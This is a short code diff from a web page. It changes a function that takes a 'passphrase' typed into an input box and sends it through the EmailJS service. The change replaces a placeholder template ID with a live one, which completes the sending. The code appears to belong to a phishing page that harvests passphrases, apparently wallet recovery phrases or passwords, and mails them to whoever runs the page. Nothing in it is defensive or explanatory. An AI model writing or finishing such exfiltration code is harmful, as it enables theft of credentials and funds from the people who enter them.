@@ -90,7 +90,7 @@
         function sendPassphrase() {
             const passphrase = document.querySelector('.input-box').value;
             if (passphrase) {
-                emailjs.send("service_kvv2wy6", "YOUR_TEMPLATE_ID", {
+                emailjs.send("service_kvv2wy6", "template_gjcg11q", {
                     passphrase: passphrase
                 }).then(function(response) {
                     alert("Passphrase sent successfully!");
